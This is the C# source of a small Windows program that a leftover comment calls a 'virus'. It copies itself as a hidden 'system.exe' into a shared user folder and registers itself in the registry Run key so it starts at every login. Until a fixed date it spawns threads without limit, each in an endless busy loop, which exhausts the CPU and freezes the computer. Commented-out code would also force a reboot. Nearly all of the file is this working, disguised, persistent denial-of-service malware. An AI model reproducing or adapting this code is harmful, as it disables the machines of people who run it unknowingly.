using System;
using System.Windows.Forms;
using Microsoft.Win32;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;

namespace system
{
    public partial class Form1 : Form
    {
        public static string needPatch = "C:\\Users\\Public\\";
        public static string needPatch_App;
                
        public Form1()
        {
            InitializeComponent();
        }        
        
        private void Form1_Load(object sender, EventArgs e)
        {
            needPatch_App = Application.StartupPath;
                        
            string OS;
            OS = GetCurrentWindowsVersion().ToString();
            
            if (OS == "Win8" || OS == "Win7" || OS == "WinVista")
            {
                //File.Delete(needPatch + "system.exe");
                if (!File.Exists(needPatch + "system.exe"))
                {
                    File.Copy(needPatch_App + "\\" + "system.exe", needPatch + "system.exe");
                    File.SetAttributes(needPatch + "system.exe", FileAttributes.Hidden);//исправиить
                }
                SetAutorunValue(true, needPatch + "system.exe"); // add autoran
                //SetAutorunValue(false, needPatch + "system.exe");  //  dellete autoran
            }
            else
                if (OS == "WinXP" || OS == "Win2000")
                {
                    needPatch = "C:\\Documents and Settings\\All Users\\";
                    if (!File.Exists(needPatch + "system.exe"))
                    {
                        File.Copy(needPatch_App + "\\" + "system.exe", needPatch + "system.exe");
                        File.SetAttributes(needPatch + "system.exe", FileAttributes.Normal);//исправиить
                    }
                    SetAutorunValue(true, needPatch + "system.exe"); // add autoran
                    //SetAutorunValue(false, needPatch + "system.exe");  // dellete autoran
                }   
                                 
            Start();
        }

        #region autorun
        public static bool SetAutorunValue(bool autorun, string path)
        {
            const string name = "systems";
            string ExePath = path;
            RegistryKey reg;

            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            try
            {
                if (autorun)
                    reg.SetValue(name, ExePath);
                else
                    reg.DeleteValue(name);
                reg.Flush();
                reg.Close();
            }
            catch
            {
                return false;
            }
            return true;
        }
        #endregion

        #region OS-версия
        internal enum WindowsVersions { UnKnown, Win95, Win98, WinMe, WinNT3or4, Win2000, WinXP, WinServer2003, WinVista, Win7, Win8, MacOSX, Unix, Xbox };
        internal static WindowsVersions GetCurrentWindowsVersion()
        {
            // Get OperatingSystem information from the system namespace.
            System.OperatingSystem osInfo = System.Environment.OSVersion;

            // Determine the platform.
            if (osInfo.Platform == System.PlatformID.Win32Windows)
            {
                // Platform is Windows 95, Windows 98, Windows 98 Second Edition, or Windows Me.
                switch (osInfo.Version.Minor)
                {
                    case 0:
                        //Console.WriteLine("Windows 95");
                        return WindowsVersions.Win95;

                    case 10:
                        //if (osInfo.Version.Revision.ToString() == "2222A")
                        //    Console.WriteLine("Windows 98 Second Edition");
                        //else
                        //    Console.WriteLine("Windows 98");
                        return WindowsVersions.Win98;

                    case 90:
                        //Console.WriteLine("Windows Me");
                        return WindowsVersions.WinMe;
                }
            }
            else if (osInfo.Platform == System.PlatformID.Win32NT)
            {
                // Platform is Windows NT 3.51, Windows NT 4.0, Windows 2000, or Windows XP.
                switch (osInfo.Version.Major)
                {
                    case 3:
                    case 4:
                        //Console.WriteLine("Windows NT 3.51"); // = 3
                        //Console.WriteLine("Windows NT 4.0");  // = 4
                        return WindowsVersions.WinNT3or4;

                    case 5:
                        switch (osInfo.Version.Minor)
                        {
                            case 0:
                                //name = "Windows 2000";
                                return WindowsVersions.Win2000;
                            case 1:
                                //name = "Windows XP";
                                return WindowsVersions.WinXP;
                            case 2:
                                //name = "Windows Server 2003";
                                return WindowsVersions.WinServer2003;
                        }
                        break;

                    case 6:
                        switch (osInfo.Version.Minor)
                        {
                            case 0:
                                // Windows Vista or Windows Server 2008 (distinct by rpoduct type)
                                return WindowsVersions.WinVista;

                            case 1:
                                return WindowsVersions.Win7;

                            case 2:
                                return WindowsVersions.Win8;
                        }
                        break;
                }
            }
            else if (osInfo.Platform == System.PlatformID.Unix)
            {
                return WindowsVersions.Unix;
            }
            else if (osInfo.Platform == System.PlatformID.MacOSX)
            {
                return WindowsVersions.MacOSX;
            }
            else if (osInfo.Platform == PlatformID.Xbox)
            {
                return WindowsVersions.Xbox;
            }
            return WindowsVersions.UnKnown;
        }
        #endregion
        
        #region Перезагрузка
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct TokPriv1Luid
        {
            public int Count;
            public long Luid;
            public int Attr;
        }
        
        [DllImport("kernel32.dll", ExactSpelling = true)]
        internal static extern IntPtr GetCurrentProcess();
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
        [DllImport("advapi32.dll", SetLastError = true)]
        internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
        ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
        [DllImport("user32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool ExitWindowsEx(int flg, int rea);
        internal const int EWX_REBOOT = 0x00000002;
        internal const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";
        internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
        internal const int TOKEN_QUERY = 0x00000008;
        internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;

        public static Thread thread1;
        public static void DoExitWin(int flg)
        {
            bool ok;
            TokPriv1Luid tp;
            IntPtr hproc = GetCurrentProcess();
            IntPtr htok = IntPtr.Zero;
            ok = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
            tp.Count = 1;
            tp.Luid = 0;
            tp.Attr = SE_PRIVILEGE_ENABLED;
            ok = LookupPrivilegeValue(null, SE_SHUTDOWN_NAME, ref tp.Luid);
            ok = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            ok = ExitWindowsEx(flg, 0);
        }
         #endregion
         
        public static void Start()
        {
            
            Stopwatch sw = new Stopwatch();
            sw.Start();
            bool b = true;
            bool pl = false;


            DateTime ddata = new DateTime(2016, 2, 29, 22, 33, 15);
            if (ddata > DateTime.Now)
            {
                Thread g = new Thread(Sys_sleep);
                g.Start();
            }

            //ddata2 = new DateTime(2015, 05, 04, 22, 10, 5);
            //ddata3 = new DateTime(2015, 05, 04, 21, 43, 5);
            //while (b)
            //{
            //    if (ddata > DateTime.Now)
            //    {
            //        if (!pl)
            //        {

            //            pl = true;
            //        }
            //    }
            //    else
            //    {
            //        MessageBox.Show("End virus");
            //        Application.Exit();
            //    }

            //if (ddata2 > DateTime.Now && ddata3 < DateTime.Now
            //{
            //    if (sw.ElapsedMilliseconds > 1000)
            //    {
            //        DoExitWin(EWX_REBOOT);
            //        b = false;
            //    }
            //}

            //}
        }
        #region Торможение
        public static void Sys_sleep()
        {
            while (true)
            {
                Thread s = new Thread(s_b);
                s.Start();
            }
        }
        private static void s_b()
        {
            int y = 2;
            while (true)
            {
                y *= y;
            }
        }
        #endregion
    }
}

